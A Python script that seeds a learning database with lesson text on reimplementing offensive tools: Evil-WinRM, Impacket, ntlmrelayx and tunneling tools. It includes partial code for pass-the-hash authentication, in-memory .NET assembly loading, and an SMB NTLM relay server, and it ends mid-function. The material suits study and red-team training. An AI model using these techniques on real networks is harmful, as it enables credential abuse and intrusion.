#!/usr/bin/env python3
"""Fix paths that have generic template tasks with domain-specific content."""

import sqlite3

DB_PATH = "data/quest-log.db"

# Map (path_name, generic_task_title) -> specific details
SPECIFIC_DETAILS = {
    # ============== Evil-WinRM & C2 Frameworks ==============
    ("Reimplement: Evil-WinRM & C2 Frameworks", "Research the domain"): """## WinRM & C2 Framework Research

### WinRM Protocol Fundamentals
```
WinRM (Windows Remote Management):
- Microsoft's implementation of WS-Management protocol
- Uses HTTP (5985) or HTTPS (5986) for transport
- SOAP-based XML messaging format
- Supports multiple authentication methods: Negotiate, Kerberos, NTLM, Basic

Evil-WinRM Features to Understand:
- Interactive PowerShell shell over WinRM
- File upload/download capabilities
- In-memory .NET assembly loading (Bypass-4MSI)
- Dll/C# assembly injection
- Pass-the-hash authentication
```

### C2 Framework Architecture
```
Core C2 Components:
1. Team Server: Central controller, manages operators and implants
2. Listeners: Accept incoming connections (HTTP, HTTPS, DNS, SMB)
3. Implants/Beacons: Client-side agents on compromised hosts
4. Stagers: Small payloads that download full implant

Communication Patterns:
- Pull-based: Implant polls server (HTTP beacons)
- Push-based: Server pushes commands (SMB pipes)
- Asynchronous: Sleep intervals, jitter for evasion
```

### Key Concepts
- WS-Management specification (DMTF standard)
- SOAP envelope structure for WinRM
- Kerberos/NTLM authentication flows
- Beacon sleep and jitter patterns

### Completion Criteria
- [ ] Understand WinRM protocol and authentication
- [ ] Study Evil-WinRM source code architecture
- [ ] Research Cobalt Strike/Sliver C2 design patterns
- [ ] Document command execution flow over WinRM""",

    ("Reimplement: Evil-WinRM & C2 Frameworks", "Design architecture"): """## Evil-WinRM Architecture Design

### Component Architecture
```
┌─────────────────────────────────────────────────────────┐
│                    Evil-WinRM Client                     │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐ │
│  │   CLI/UI    │  │   Session   │  │  File Transfer  │ │
│  │   Module    │  │   Manager   │  │     Module      │ │
│  └──────┬──────┘  └──────┬──────┘  └────────┬────────┘ │
│         │                │                   │          │
│  ┌──────┴────────────────┴───────────────────┴───────┐ │
│  │              WinRM Protocol Handler                │ │
│  │  - SOAP Message Builder                           │ │
│  │  - Shell Management (Create/Delete)               │ │
│  │  - Command Execution                              │ │
│  └──────────────────────┬────────────────────────────┘ │
│                         │                               │
│  ┌──────────────────────┴────────────────────────────┐ │
│  │           Authentication Module                    │ │
│  │  - NTLM (Pass-the-Hash)                          │ │
│  │  - Kerberos (Pass-the-Ticket)                    │ │
│  │  - Basic/Negotiate                                │ │
│  └──────────────────────┬────────────────────────────┘ │
│                         │                               │
│  ┌──────────────────────┴────────────────────────────┐ │
│  │              HTTP/HTTPS Transport                  │ │
│  └───────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

### Core Classes
```python
class WinRMClient:
    def __init__(self, host, port=5985, ssl=False):
        self.endpoint = f"{'https' if ssl else 'http'}://{host}:{port}/wsman"
        self.shell_id = None

class NTLMAuth:
    def authenticate(self, username, password=None, nt_hash=None): pass

class ShellManager:
    def create_shell(self) -> str: pass  # Returns shell_id
    def execute_command(self, shell_id, command) -> str: pass
    def delete_shell(self, shell_id): pass
```

### Completion Criteria
- [ ] Design modular architecture with clear separation
- [ ] Plan authentication abstraction for multiple methods
- [ ] Design shell lifecycle management
- [ ] Plan file transfer protocol implementation""",

    ("Reimplement: Evil-WinRM & C2 Frameworks", "Set up project structure"): """## Evil-WinRM Project Structure

### Directory Layout
```
evil-winrm/
├── cmd/
│   └── evil-winrm/
│       └── main.go              # CLI entry point
├── pkg/
│   ├── winrm/
│   │   ├── client.go            # WinRM client implementation
│   │   ├── shell.go             # Shell management
│   │   ├── command.go           # Command execution
│   │   └── soap.go              # SOAP message builder
│   ├── auth/
│   │   ├── ntlm.go              # NTLM authentication
│   │   ├── kerberos.go          # Kerberos authentication
│   │   └── negotiate.go         # Negotiate (SPNEGO)
│   ├── transfer/
│   │   ├── upload.go            # File upload
│   │   └── download.go          # File download
│   └── loader/
│       ├── assembly.go          # .NET assembly loading
│       └── powershell.go        # PowerShell script execution
├── internal/
│   ├── console/
│   │   ├── repl.go              # Interactive shell REPL
│   │   └── completer.go         # Tab completion
│   └── menu/
│       └── commands.go          # Built-in commands
├── scripts/
│   └── Bypass-4MSI.ps1          # AMSI bypass script
└── go.mod
```

### Dependencies
```go
// go.mod
module github.com/yourname/evil-winrm

require (
    github.com/Azure/go-ntlmssp v0.0.0  // NTLM auth
    github.com/jcmturner/gokrb5/v8      // Kerberos
    github.com/chzyer/readline          // Interactive shell
    github.com/fatih/color              // Colored output
)
```

### Completion Criteria
- [ ] Set up Go module with dependencies
- [ ] Create package structure for modularity
- [ ] Implement basic CLI skeleton
- [ ] Add configuration file support""",

    ("Reimplement: Evil-WinRM & C2 Frameworks", "Implement core logic"): """## WinRM Core Implementation

### SOAP Message Construction
```python
import xml.etree.ElementTree as ET

class WinRMClient:
    NAMESPACES = {
        's': 'http://www.w3.org/2003/05/soap-envelope',
        'wsa': 'http://schemas.xmlsoap.org/ws/2004/08/addressing',
        'wsman': 'http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd',
        'rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell',
    }

    def __init__(self, host, port=5985, ssl=False):
        self.endpoint = f"{'https' if ssl else 'http'}://{host}:{port}/wsman"
        self.shell_id = None

    def create_shell(self):
        \"\"\"Create a new command shell.\"\"\"
        body = '''
        <rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
            <rsp:InputStreams>stdin</rsp:InputStreams>
            <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
        </rsp:Shell>
        '''
        envelope = self._build_envelope(
            action='http://schemas.xmlsoap.org/ws/2004/09/transfer/Create',
            resource_uri='http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd',
            body=body
        )
        response = self._send(envelope)
        self.shell_id = self._parse_shell_id(response)
        return self.shell_id

    def execute(self, command):
        \"\"\"Execute command in shell.\"\"\"
        command_id = self._send_command(command)
        output = self._receive_output(command_id)
        self._signal_terminate(command_id)
        return output

    def _build_envelope(self, action, resource_uri, body):
        return f'''<?xml version="1.0" encoding="UTF-8"?>
        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
                    xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                    xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
            <s:Header>
                <wsa:Action>{action}</wsa:Action>
                <wsa:To>{self.endpoint}</wsa:To>
                <wsman:ResourceURI>{resource_uri}</wsman:ResourceURI>
            </s:Header>
            <s:Body>{body}</s:Body>
        </s:Envelope>'''
```

### Key Concepts
- WS-Management SOAP envelope structure
- Shell lifecycle: Create → Execute → Signal → Delete
- Command output streaming with base64 encoding
- Timeout handling for long-running commands

### Completion Criteria
- [ ] Implement SOAP message builder
- [ ] Implement shell creation/deletion
- [ ] Implement command execution
- [ ] Handle output streaming correctly""",

    ("Reimplement: Evil-WinRM & C2 Frameworks", "Add error handling"): """## WinRM Error Handling

### WinRM-Specific Errors
```python
class WinRMError(Exception):
    \"\"\"Base WinRM exception.\"\"\"
    pass

class WinRMAuthenticationError(WinRMError):
    \"\"\"Authentication failed - bad credentials or access denied.\"\"\"
    pass

class WinRMConnectionError(WinRMError):
    \"\"\"Cannot connect to WinRM service.\"\"\"
    pass

class WinRMTimeoutError(WinRMError):
    \"\"\"Command execution timed out.\"\"\"
    pass

class WinRMShellError(WinRMError):
    \"\"\"Shell creation or management failed.\"\"\"
    pass

def parse_winrm_fault(response_xml):
    \"\"\"Parse SOAP Fault from WinRM response.\"\"\"
    # Common faults:
    # - wsman:AccessDenied - Authentication/authorization failed
    # - wsman:TimedOut - Operation timeout
    # - wsman:QuotaLimit - Too many shells
    # - shell:Terminate - Shell was terminated

    faults = {
        'AccessDenied': WinRMAuthenticationError,
        'TimedOut': WinRMTimeoutError,
        'QuotaLimit': WinRMShellError,
    }

    # Parse fault code from XML
    fault_code = extract_fault_code(response_xml)
    error_class = faults.get(fault_code, WinRMError)
    raise error_class(f"WinRM fault: {fault_code}")

class WinRMClient:
    def execute_safe(self, command):
        \"\"\"Execute with comprehensive error handling.\"\"\"
        try:
            if not self.shell_id:
                raise WinRMShellError("No active shell")
            return self.execute(command)
        except ConnectionRefusedError:
            raise WinRMConnectionError(f"Cannot connect to {self.endpoint}")
        except TimeoutError:
            raise WinRMTimeoutError("Command timed out")
        except ET.ParseError as e:
            raise WinRMError(f"Invalid response: {e}")
```

### Completion Criteria
- [ ] Define WinRM-specific exception hierarchy
- [ ] Parse SOAP Fault responses
- [ ] Handle connection/timeout errors
- [ ] Implement retry logic for transient failures""",

    ("Reimplement: Evil-WinRM & C2 Frameworks", "Implement main features"): """## Evil-WinRM Feature Implementation

### Pass-the-Hash Authentication
```python
from ntlm_auth.ntlm import NtlmContext

class PTHAuth:
    def __init__(self, username, nt_hash, domain=''):
        self.username = username
        self.nt_hash = bytes.fromhex(nt_hash)
        self.domain = domain

    def get_auth_header(self, challenge=None):
        \"\"\"Generate NTLM auth header using NT hash instead of password.\"\"\"
        if challenge is None:
            # Type 1: Negotiate message
            return self._create_negotiate_message()
        else:
            # Type 3: Authenticate message using NT hash
            return self._create_auth_message(challenge, self.nt_hash)

### File Upload/Download
class FileTransfer:
    def __init__(self, client):
        self.client = client

    def upload(self, local_path, remote_path):
        \"\"\"Upload file using PowerShell.\"\"\"
        with open(local_path, 'rb') as f:
            content = base64.b64encode(f.read()).decode()

        ps_command = f'''
        $bytes = [Convert]::FromBase64String("{content}")
        [IO.File]::WriteAllBytes("{remote_path}", $bytes)
        '''
        return self.client.execute(f'powershell -enc {self._encode_ps(ps_command)}')

    def download(self, remote_path, local_path):
        \"\"\"Download file using PowerShell.\"\"\"
        ps_command = f'[Convert]::ToBase64String([IO.File]::ReadAllBytes("{remote_path}"))'
        output = self.client.execute(f'powershell -c {ps_command}')

        with open(local_path, 'wb') as f:
            f.write(base64.b64decode(output.strip()))

### .NET Assembly Loading
class AssemblyLoader:
    def load_and_execute(self, assembly_path, args=''):
        \"\"\"Load .NET assembly in memory and execute.\"\"\"
        with open(assembly_path, 'rb') as f:
            assembly_b64 = base64.b64encode(f.read()).decode()

        ps_script = f'''
        $bytes = [Convert]::FromBase64String("{assembly_b64}")
        $assembly = [Reflection.Assembly]::Load($bytes)
        $assembly.EntryPoint.Invoke($null, @(,@({args})))
        '''
        return self.client.execute(f'powershell -enc {self._encode_ps(ps_script)}')
```

### Completion Criteria
- [ ] Implement pass-the-hash authentication
- [ ] Build file upload/download functionality
- [ ] Implement in-memory .NET assembly loading
- [ ] Add AMSI bypass capability""",

    # ============== Impacket Suite ==============
    ("Reimplement: Impacket Suite", "Research the domain"): """## Impacket Protocol Research

### Core Protocols
```
SMB (Server Message Block):
- Port 445 (direct) or 139 (over NetBIOS)
- File sharing, named pipes, printer sharing
- SMBv1, SMBv2, SMBv3 with signing/encryption
- Key operations: Session Setup, Tree Connect, Create, Read, Write

MSRPC (Microsoft Remote Procedure Call):
- Built on DCE/RPC
- Named pipes (\\pipe\\) or TCP 135
- Key interfaces: SAMR, LSARPC, DRSUAPI, SRVS

NTLM Authentication:
- Challenge-response protocol
- Type 1 (Negotiate) → Type 2 (Challenge) → Type 3 (Authenticate)
- NTLMv1 vs NTLMv2 (security implications)

Kerberos:
- AS-REQ/AS-REP: Get TGT from KDC
- TGS-REQ/TGS-REP: Get service ticket
- AP-REQ/AP-REP: Authenticate to service
- Key attacks: Kerberoasting, AS-REP Roasting, Pass-the-Ticket
```

### Impacket Tools to Study
```
- secretsdump.py: DCSync, SAM dump, LSA secrets
- psexec.py: Remote execution via service creation
- smbclient.py: SMB file operations
- GetNPUsers.py: AS-REP roasting
- GetUserSPNs.py: Kerberoasting
- ntlmrelayx.py: NTLM relay attacks
```

### Completion Criteria
- [ ] Understand SMB protocol message format
- [ ] Study NTLM authentication flow
- [ ] Learn Kerberos ticket structures
- [ ] Map Impacket module dependencies""",

    ("Reimplement: Impacket Suite", "Design architecture"): """## Impacket Architecture Design

### Layered Protocol Stack
```
┌─────────────────────────────────────────────────┐
│              High-Level Tools                    │
│  (secretsdump, psexec, smbclient, GetUserSPNs) │
├─────────────────────────────────────────────────┤
│              Protocol Clients                    │
│  ┌─────────┐ ┌─────────┐ ┌─────────────────┐   │
│  │  SMB    │ │  LDAP   │ │  MSRPC Clients  │   │
│  │ Client  │ │ Client  │ │ (SAMR,DRSUAPI) │   │
│  └────┬────┘ └────┬────┘ └────────┬────────┘   │
├───────┴──────────┴────────────────┴─────────────┤
│              Authentication Layer                │
│  ┌─────────────┐  ┌───────────────────────┐    │
│  │    NTLM     │  │      Kerberos         │    │
│  │ (ntlm.py)   │  │   (krb5/kerb.py)      │    │
│  └─────────────┘  └───────────────────────┘    │
├─────────────────────────────────────────────────┤
│              Transport Layer                     │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐   │
│  │   TCP     │  │   SMB     │  │  NetBIOS  │   │
│  │  Socket   │  │ Transport │  │  Session  │   │
│  └───────────┘  └───────────┘  └───────────┘   │
└─────────────────────────────────────────────────┘
```

### Core Classes
```python
class SMBConnection:
    def negotiate(self) -> SMBNegotiateResponse: pass
    def session_setup(self, auth) -> SMBSessionSetupResponse: pass
    def tree_connect(self, share) -> int: pass  # Returns tree_id

class NTLMAuth:
    def get_negotiate_message(self) -> bytes: pass
    def get_auth_message(self, challenge) -> bytes: pass

class KerberosAuth:
    def get_tgt(self, username, password) -> Ticket: pass
    def get_service_ticket(self, tgt, spn) -> Ticket: pass
```

### Completion Criteria
- [ ] Design modular protocol stack
- [ ] Define clean interfaces between layers
- [ ] Plan authentication abstraction
- [ ] Map tool dependencies to protocol layers""",

    ("Reimplement: Impacket Suite", "Set up project structure"): """## Impacket Project Structure

### Directory Layout
```
impacket-lite/
├── impacket/
│   ├── __init__.py
│   ├── smb/
│   │   ├── __init__.py
│   │   ├── smb.py              # SMB1 implementation
│   │   ├── smb3.py             # SMB2/3 implementation
│   │   ├── smb_structs.py      # SMB packet structures
│   │   └── smbconnection.py    # High-level SMB client
│   ├── dcerpc/
│   │   ├── __init__.py
│   │   ├── rpcrt.py            # DCE/RPC runtime
│   │   ├── transport.py        # RPC transports
│   │   └── v5/
│   │       ├── samr.py         # SAM Remote interface
│   │       ├── lsad.py         # LSA interface
│   │       ├── drsuapi.py      # Directory Replication
│   │       └── srvs.py         # Server Service
│   ├── krb5/
│   │   ├── __init__.py
│   │   ├── asn1.py             # Kerberos ASN.1 structures
│   │   ├── types.py            # Kerberos types
│   │   ├── crypto.py           # Kerberos encryption
│   │   └── kerberosv5.py       # Kerberos client
│   ├── ntlm.py                 # NTLM authentication
│   └── structure.py            # Binary structure packing
├── examples/
│   ├── secretsdump.py
│   ├── psexec.py
│   ├── smbclient.py
│   └── GetUserSPNs.py
└── setup.py
```

### Completion Criteria
- [ ] Set up Python package structure
- [ ] Create protocol module hierarchy
- [ ] Add example tools directory
- [ ] Set up development environment""",

    ("Reimplement: Impacket Suite", "Implement core logic"): """## Impacket Core Implementation

### SMB Connection
```python
import struct
import socket

class SMBPacket:
    def __init__(self):
        self.command = 0
        self.flags = 0
        self.flags2 = 0
        self.tid = 0
        self.pid = 0
        self.uid = 0
        self.mid = 0

    def pack(self):
        return struct.pack('<4sBIBHHQHHHHH',
            b'\\xffSMB',      # Protocol ID
            self.command,
            0,                # Status
            self.flags,
            self.flags2,
            0,                # PID high
            0,                # Signature
            0,                # Reserved
            self.tid,
            self.pid,
            self.uid,
            self.mid
        )

class SMBConnection:
    def __init__(self, host, port=445):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        self.uid = 0
        self.tid = 0

    def negotiate(self):
        \"\"\"Send SMB_COM_NEGOTIATE to establish dialect.\"\"\"
        dialects = b'\\x02NT LM 0.12\\x00\\x02SMB 2.002\\x00'
        pkt = self._build_negotiate(dialects)
        self._send(pkt)
        return self._recv_negotiate_response()

    def session_setup_ntlm(self, username, password, domain=''):
        \"\"\"NTLM authentication.\"\"\"
        # Type 1 message
        ntlm_negotiate = NTLM().get_negotiate_message()
        response = self._send_session_setup(ntlm_negotiate)

        # Parse Type 2 challenge
        challenge = self._parse_ntlm_challenge(response)

        # Type 3 authentication
        ntlm_auth = NTLM().get_auth_message(username, password, challenge)
        response = self._send_session_setup(ntlm_auth)

        self.uid = response.uid
        return response.status == 0
```

### Completion Criteria
- [ ] Implement SMB packet structures
- [ ] Implement negotiate and session setup
- [ ] Add tree connect for share access
- [ ] Build file read/write operations""",

    ("Reimplement: Impacket Suite", "Add error handling"): """## Impacket Error Handling

### Protocol-Specific Exceptions
```python
class ImpacketError(Exception):
    \"\"\"Base Impacket exception.\"\"\"
    pass

class SMBError(ImpacketError):
    NT_STATUS_CODES = {
        0xC0000022: 'ACCESS_DENIED',
        0xC000006D: 'LOGON_FAILURE',
        0xC0000064: 'NO_SUCH_USER',
        0xC000006A: 'WRONG_PASSWORD',
        0xC0000234: 'ACCOUNT_LOCKED_OUT',
        0xC0000072: 'ACCOUNT_DISABLED',
    }

    def __init__(self, status_code):
        self.status = status_code
        self.message = self.NT_STATUS_CODES.get(status_code, f'Unknown: {hex(status_code)}')
        super().__init__(self.message)

class KerberosError(ImpacketError):
    KRB_ERROR_CODES = {
        6: 'KDC_ERR_C_PRINCIPAL_UNKNOWN',
        18: 'KDC_ERR_CLIENT_REVOKED',
        23: 'KDC_ERR_KEY_EXPIRED',
        24: 'KDC_ERR_PREAUTH_FAILED',
    }

class DCERPCError(ImpacketError):
    \"\"\"DCE/RPC specific errors.\"\"\"
    pass

def check_smb_status(response):
    if response.status != 0:
        raise SMBError(response.status)
    return response

# Usage
try:
    conn.session_setup_ntlm(user, password)
except SMBError as e:
    if e.status == 0xC000006D:
        print("Invalid credentials")
    elif e.status == 0xC0000234:
        print("Account locked out!")
```

### Completion Criteria
- [ ] Define SMB NT_STATUS error codes
- [ ] Define Kerberos error codes
- [ ] Implement error parsing from responses
- [ ] Add meaningful error messages""",

    # ============== ntlmrelayx ==============
    ("Reimplement: ntlmrelayx", "Research the domain"): """## NTLM Relay Attack Research

### NTLM Relay Fundamentals
```
Attack Flow:
1. Victim connects to attacker (via LLMNR/NBT-NS poisoning, mitm6, etc.)
2. Attacker captures NTLM Type 1 (Negotiate) from victim
3. Attacker forwards Type 1 to target server
4. Target responds with Type 2 (Challenge)
5. Attacker relays Challenge back to victim
6. Victim responds with Type 3 (Authenticate)
7. Attacker forwards Type 3 to target → Authenticated!

Key insight: NTLM challenge-response doesn't bind to specific server
```

### Relay Targets
```
SMB Relay:
- Execute commands via psexec/smbexec
- Read/write files on shares
- Dump SAM/secrets

HTTP/LDAP Relay:
- HTTP to LDAP: Create machine accounts, delegate
- HTTP to ADCS: Request certificates (ESC8)
- Modify AD objects

MSSQL Relay:
- Execute SQL queries
- Enable xp_cmdshell for RCE
```

### Mitigations to Understand
```
- SMB Signing (required)
- EPA (Extended Protection for Authentication)
- LDAP Channel Binding
- LDAPS enforcement
```

### Completion Criteria
- [ ] Understand NTLM authentication flow
- [ ] Study relay attack vectors
- [ ] Learn about signing and channel binding
- [ ] Map relay targets and their protocols""",

    ("Reimplement: ntlmrelayx", "Design architecture"): """## ntlmrelayx Architecture

### Component Design
```
┌─────────────────────────────────────────────────────────┐
│                    ntlmrelayx                            │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │              Capture Servers                      │   │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐            │   │
│  │  │  SMB    │ │  HTTP   │ │  LDAP   │            │   │
│  │  │ Server  │ │ Server  │ │ Server  │            │   │
│  │  └────┬────┘ └────┬────┘ └────┬────┘            │   │
│  └───────┴──────────┴──────────┴────────────────────┘   │
│                      │                                   │
│  ┌───────────────────┴───────────────────────────────┐  │
│  │              NTLM Capture/Relay Engine             │  │
│  │  - Extract Type 1 from incoming connection        │  │
│  │  - Forward to target, receive Type 2              │  │
│  │  - Relay Type 2 to victim, receive Type 3         │  │
│  │  - Forward Type 3 to complete authentication      │  │
│  └───────────────────┬───────────────────────────────┘  │
│                      │                                   │
│  ┌───────────────────┴───────────────────────────────┐  │
│  │              Relay Clients                         │  │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐ │  │
│  │  │  SMB    │ │  LDAP   │ │  HTTP   │ │  MSSQL  │ │  │
│  │  │ Client  │ │ Client  │ │ Client  │ │ Client  │ │  │
│  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘ │  │
│  └───────────────────────────────────────────────────┘  │
│                      │                                   │
│  ┌───────────────────┴───────────────────────────────┐  │
│  │              Attack Modules                        │  │
│  │  - SMBExec, SecretsDump, Shadow Credentials       │  │
│  │  - LDAP modify, Add computer, Delegate            │  │
│  │  - ADCS certificate request (ESC8)                │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Completion Criteria
- [ ] Design capture server abstraction
- [ ] Plan relay client interface
- [ ] Design attack module system
- [ ] Plan target management and queuing""",

    ("Reimplement: ntlmrelayx", "Set up project structure"): """## ntlmrelayx Project Structure

### Directory Layout
```
ntlmrelayx/
├── ntlmrelayx.py                 # Main entry point
├── lib/
│   ├── __init__.py
│   ├── servers/                  # Capture servers
│   │   ├── __init__.py
│   │   ├── smbserver.py         # SMB capture server
│   │   ├── httpserver.py        # HTTP capture server
│   │   └── ldapserver.py        # LDAP capture server
│   ├── clients/                  # Relay clients
│   │   ├── __init__.py
│   │   ├── smbrelayclient.py    # SMB relay client
│   │   ├── ldaprelayclient.py   # LDAP relay client
│   │   ├── httprelayclient.py   # HTTP relay client
│   │   └── mssqlrelayclient.py  # MSSQL relay client
│   ├── attacks/                  # Attack modules
│   │   ├── __init__.py
│   │   ├── smbattack.py         # SMB attacks (psexec, dump)
│   │   ├── ldapattack.py        # LDAP attacks (delegate, addcomputer)
│   │   └── httpattack.py        # HTTP attacks (ADCS)
│   ├── utils/
│   │   ├── __init__.py
│   │   ├── ntlm.py              # NTLM message handling
│   │   └── targetsutils.py      # Target management
│   └── core/
│       ├── __init__.py
│       └── relayengine.py       # Core relay logic
└── tests/
```

### Completion Criteria
- [ ] Create modular package structure
- [ ] Set up server/client interfaces
- [ ] Create attack module template
- [ ] Add configuration management""",

    ("Reimplement: ntlmrelayx", "Implement core logic"): """## NTLM Relay Core Implementation

### SMB Capture Server
```python
import socketserver
import struct

class SMBRelayServer(socketserver.ThreadingTCPServer):
    def __init__(self, server_address, relay_client):
        self.relay_client = relay_client
        super().__init__(server_address, SMBRelayHandler)

class SMBRelayHandler(socketserver.BaseRequestHandler):
    def handle(self):
        # Receive SMB negotiate
        data = self.request.recv(4096)

        # Send negotiate response
        self.request.send(self.build_negotiate_response())

        # Receive Session Setup with NTLM Type 1
        data = self.request.recv(4096)
        ntlm_negotiate = self.extract_ntlm(data)

        # Forward Type 1 to target, get Type 2
        ntlm_challenge = self.server.relay_client.send_negotiate(ntlm_negotiate)

        # Send Type 2 back to victim
        self.request.send(self.build_session_setup_response(ntlm_challenge))

        # Receive Type 3 from victim
        data = self.request.recv(4096)
        ntlm_auth = self.extract_ntlm(data)

        # Forward Type 3 to target
        success = self.server.relay_client.send_auth(ntlm_auth)

        if success:
            print(f"[+] Relay successful!")
            self.server.relay_client.execute_attack()

### Relay Client
class SMBRelayClient:
    def __init__(self, target):
        self.target = target
        self.conn = SMBConnection(target)

    def send_negotiate(self, ntlm_type1):
        \"\"\"Send NTLM Type 1, receive Type 2 challenge.\"\"\"
        self.conn.negotiate()
        response = self.conn.session_setup_ntlm_negotiate(ntlm_type1)
        return response.ntlm_challenge

    def send_auth(self, ntlm_type3):
        \"\"\"Send NTLM Type 3, complete authentication.\"\"\"
        response = self.conn.session_setup_ntlm_auth(ntlm_type3)
        return response.status == 0
```

### Completion Criteria
- [ ] Implement SMB capture server
- [ ] Implement NTLM message extraction
- [ ] Build relay client for targets
- [ ] Handle multi-target queuing""",

    ("Reimplement: ntlmrelayx", "Add error handling"): """## ntlmrelayx Error Handling

### Relay-Specific Errors
```python
class RelayError(Exception):
    \"\"\"Base relay exception.\"\"\"
    pass

class RelayAuthenticationError(RelayError):
    \"\"\"Target rejected authentication.\"\"\"
    pass

class SigningRequiredError(RelayError):
    \"\"\"Target requires SMB signing - relay not possible.\"\"\"
    pass

class ChannelBindingError(RelayError):
    \"\"\"Target requires channel binding (EPA).\"\"\"
    pass

class TargetNotVulnerableError(RelayError):
    \"\"\"Target not vulnerable to relay.\"\"\"
    pass

def check_relay_conditions(target, protocol):
    \"\"\"Check if relay is possible to target.\"\"\"
    if protocol == 'smb':
        if target.signing_required:
            raise SigningRequiredError(f"{target} requires SMB signing")
    elif protocol == 'ldap':
        if target.channel_binding:
            raise ChannelBindingError(f"{target} requires channel binding")
    elif protocol == 'http':
        if target.epa_enabled:
            raise ChannelBindingError(f"{target} has EPA enabled")

class RelayEngine:
    def relay(self, victim_conn, target):
        try:
            check_relay_conditions(target, target.protocol)
            # Perform relay...
        except SigningRequiredError:
            print(f"[-] Skipping {target}: signing required")
            self.targets.mark_failed(target)
        except RelayAuthenticationError:
            print(f"[-] Relay to {target} failed: auth rejected")
```

### Completion Criteria
- [ ] Handle SMB signing detection
- [ ] Handle LDAP channel binding
- [ ] Implement target filtering
- [ ] Add retry logic for failed relays""",

    # ============== Network Tunneling Tools ==============
    ("Reimplement: Network Tunneling Tools", "Research the domain"): """## Network Tunneling Research

### Tunneling Techniques
```
SOCKS Proxy:
- SOCKS4: TCP only, no authentication
- SOCKS5: TCP/UDP, authentication, IPv6
- Dynamic port forwarding through single connection

Port Forwarding:
- Local: -L local:remote (access remote through local)
- Remote: -R remote:local (expose local to remote)
- Dynamic: -D port (SOCKS proxy)

Pivoting Tools:
- Chisel: HTTP/WebSocket tunneling
- Ligolo: TUN interface based
- SSH tunneling: Built-in, reliable
- netcat relays: Simple but limited
```

### Protocol Encapsulation
```
Common Encapsulation:
- HTTP/HTTPS: Bypass firewalls, blend with traffic
- DNS: Exfiltration, C2 (slow but stealthy)
- ICMP: Simple tunneling, often allowed
- WebSocket: Full-duplex over HTTP

Example - Chisel:
Server: chisel server -p 8080 --reverse
Client: chisel client server:8080 R:socks
```

### Completion Criteria
- [ ] Understand SOCKS protocol (RFC 1928)
- [ ] Study port forwarding patterns
- [ ] Learn HTTP tunneling techniques
- [ ] Map pivoting tool architectures""",

    ("Reimplement: Network Tunneling Tools", "Design architecture"): """## Tunneling Tool Architecture

### Chisel-like Architecture
```
┌─────────────────────────────────────────────────────────┐
│                    Chisel Server                         │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │           HTTP/WebSocket Listener                │   │
│  │  - Accept client connections                     │   │
│  │  - Upgrade to WebSocket                          │   │
│  │  - Multiplex channels                            │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │            Channel Manager                        │   │
│  │  - SOCKS proxy channels                          │   │
│  │  - Port forward channels                         │   │
│  │  - Reverse tunnel channels                       │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │            Tunnel Endpoints                       │   │
│  │  - Local listeners for reverse tunnels           │   │
│  │  - Outbound connections for forward tunnels      │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘

Multiplexing Protocol:
┌──────┬──────┬──────────┬─────────────────┐
│ Type │ Chan │  Length  │     Payload     │
│ 1B   │ 4B   │   4B     │   Variable      │
└──────┴──────┴──────────┴─────────────────┘
```

### Completion Criteria
- [ ] Design WebSocket transport layer
- [ ] Plan channel multiplexing protocol
- [ ] Design SOCKS5 server component
- [ ] Plan reverse tunnel management""",

    ("Reimplement: Network Tunneling Tools", "Set up project structure"): """## Tunneling Tool Project Structure

### Directory Layout
```
tunnel-tool/
├── cmd/
│   ├── server/
│   │   └── main.go           # Server entry point
│   └── client/
│       └── main.go           # Client entry point
├── pkg/
│   ├── tunnel/
│   │   ├── server.go         # Tunnel server
│   │   ├── client.go         # Tunnel client
│   │   ├── channel.go        # Channel management
│   │   └── mux.go            # Multiplexer
│   ├── transport/
│   │   ├── websocket.go      # WebSocket transport
│   │   ├── http.go           # HTTP transport
│   │   └── tcp.go            # Raw TCP transport
│   ├── socks/
│   │   ├── server.go         # SOCKS5 server
│   │   ├── protocol.go       # SOCKS protocol
│   │   └── auth.go           # SOCKS authentication
│   └── forward/
│       ├── local.go          # Local port forward
│       └── remote.go         # Remote port forward
├── internal/
│   ├── crypto/
│   │   └── encryption.go     # Channel encryption
│   └── config/
│       └── config.go         # Configuration
└── go.mod
```

### Completion Criteria
- [ ] Set up Go module structure
- [ ] Create transport abstraction
- [ ] Implement SOCKS5 package
- [ ] Add configuration management""",

    ("Reimplement: Network Tunneling Tools", "Implement core logic"): """## Tunneling Core Implementation

### WebSocket Tunnel
```go
package tunnel

import (
    "encoding/binary"
    "io"
    "net"
    "sync"
    "github.com/gorilla/websocket"
)

type Channel struct {
    ID     uint32
    conn   net.Conn
    sendCh chan []byte
}

type Multiplexer struct {
    ws       *websocket.Conn
    channels map[uint32]*Channel
    mu       sync.RWMutex
    nextID   uint32
}

func NewMultiplexer(ws *websocket.Conn) *Multiplexer {
    m := &Multiplexer{
        ws:       ws,
        channels: make(map[uint32]*Channel),
    }
    go m.readLoop()
    return m
}

func (m *Multiplexer) readLoop() {
    for {
        _, data, err := m.ws.ReadMessage()
        if err != nil {
            return
        }
